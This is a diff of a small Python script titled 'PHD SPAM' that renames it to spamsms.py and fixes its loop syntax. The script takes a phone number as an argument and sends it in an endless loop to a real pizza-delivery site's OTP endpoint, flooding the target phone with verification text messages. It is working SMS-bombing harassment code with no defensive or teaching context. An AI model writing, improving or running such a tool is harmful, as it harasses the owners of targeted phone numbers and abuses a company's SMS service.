@@ -1,4 +1,4 @@
-## phd.py - PHD SPAM (19-March-2018 [08:34])
+## spamsms.py - PHD SPAM (19-March-2018 [08:34])
 # -*- coding: utf-8 -*-
 ##
 import sys
@@ -19,7 +19,7 @@ def spam():
 	print __banner__
 	param = {'phone_number':''+sys.argv[1]}
 	count = 0
-	while (true):
+	while True:
 		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
 		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
 			print("\033[1;32m[  OK  ] Send Succesful...Sleep for 1 second...\033[0m")
@@ -33,7 +33,7 @@ def spam():
 if __name__ == '__main__':
 	if len(sys.argv) != 2:
 		print __banner__
-		print "Usage: phd.py PHONE"
+		print "Usage: spamsms.py PHONE"
 		sys.exit(0)
 	else:
 		spam()
